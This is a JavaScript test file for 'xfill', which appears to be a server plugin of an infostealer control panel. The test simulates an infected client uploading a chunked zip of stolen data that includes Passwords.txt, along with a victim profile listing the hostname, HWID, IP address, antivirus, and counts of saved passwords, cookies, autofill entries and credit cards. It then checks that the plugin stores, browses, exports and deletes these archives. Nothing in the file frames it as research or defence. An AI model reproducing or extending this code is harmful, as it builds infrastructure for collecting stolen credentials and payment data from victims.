import assert from "node:assert";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { Database } from "bun:sqlite";
import plugin, { buildZip } from "./server.js";

const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), "xfill-test-"));
const broadcasts = [];
const ctx = {
  pluginId: "xfill",
  db: new Database(":memory:"),
  dataDir,
  log: { debug() {}, info() {}, warn() {}, error() {} },
  broadcast: (channel, data) => broadcasts.push({ channel, data }),
};
const caller = { caller: { id: 1, username: "op", role: "admin" } };

plugin.setup(ctx);

// Build a small archive and push it as chunks
const archive = buildZip([
  { name: "Passwords.txt", data: Buffer.from("user:pass\n".repeat(500)) },
  { name: "info.json", data: Buffer.from(JSON.stringify({ a: 1 })) },
]);
const clientId = "client-abc";
const session = 42;
const CHUNK = 1024;
const chunks = [];
for (let i = 0; i < archive.length; i += CHUNK) chunks.push(archive.subarray(i, i + CHUNK));

chunks.forEach((buf, index) => {
  plugin.onEvent(ctx, clientId, "xfill_chunk", { session, index, total: chunks.length, data: buf.toString("base64") });
});
plugin.onEvent(ctx, clientId, "xfill_progress", { stage: "chromium" });

const info = {
  CreatedAt: "2026-09-24", SessionId: session, Username: "DESKTOP\\bob", HWID: "HWID123",
  Group: "default", IpAddress: "1.2.3.4", Country: "US", OperatingSystem: "Windows 11",
  OsVersion: "22631", CpuName: "cpu", GpuName: "gpu", RamSize: "16 GB", ScreenSize: "1920x1080",
  AntiVirus: " Defender", FirstTime: true, Version: "1.0", Note: "", PasswordsCount: 12,
  CookiesCount: 3400, HistoryCount: 55, AutofillCount: 3, CreditCardsCount: 2,
  BrowserExtensionsCount: 4, Browsers: ["Chrome", "Edge"], BrowserExtensions: ["a"], DesktopWallets: [], Apps: ["Telegram"], Clipboard: "",
};
plugin.onEvent(ctx, clientId, "xfill_complete", { session, size: archive.length, chunks: chunks.length, info });

const list = plugin.rpc.list(ctx);
assert.strictEqual(list.length, 1);
assert.strictEqual(list[0].clientId, clientId);
assert.strictEqual(list[0].session, session);
assert.strictEqual(list[0].size, archive.length);
assert.strictEqual(list[0].info.Username, "DESKTOP\\bob");
assert.ok(fs.existsSync(path.join(dataDir, clientId, "42.zip")), "zip on disk");
assert.ok(fs.readFileSync(path.join(dataDir, clientId, "42.zip")).equals(archive), "stored bytes match");
assert.ok(broadcasts.some((b) => b.channel === "archive_added"), "archive_added broadcast");
assert.ok(broadcasts.some((b) => b.channel === "progress"), "progress broadcast");

const id = list[0].id;
const tree = plugin.rpc.tree(ctx, { id }, caller);
assert.deepStrictEqual(tree.map((t) => t.path).sort(), ["Passwords.txt", "info.json"]);

const f1 = plugin.rpc.file(ctx, { id, path: "Passwords.txt" }, caller);
assert.strictEqual(f1.text, "user:pass\n".repeat(500));
const f2 = plugin.rpc.file(ctx, { id, path: "info.json" }, caller);
assert.strictEqual(JSON.parse(f2.text).a, 1);

const exp = plugin.rpc.exportMany(ctx, { ids: [id] }, caller);
assert.match(exp.filename, /^xfill-export-\d+\.zip$/);
assert.ok(fs.existsSync(path.join(dataDir, "exports", exp.filename)));

const rem = plugin.rpc.remove(ctx, { ids: [id] }, caller);
assert.strictEqual(rem.removed, 1);
assert.strictEqual(plugin.rpc.list(ctx).length, 0);
assert.ok(!fs.existsSync(path.join(dataDir, clientId, "42.zip")), "zip deleted");

plugin.onEvent(ctx, clientId, "xfill_error", { stage: "firefox", message: "boom" });
assert.ok(broadcasts.some((b) => b.channel === "collect_error"), "error broadcast");

console.log("server functional smoke OK");
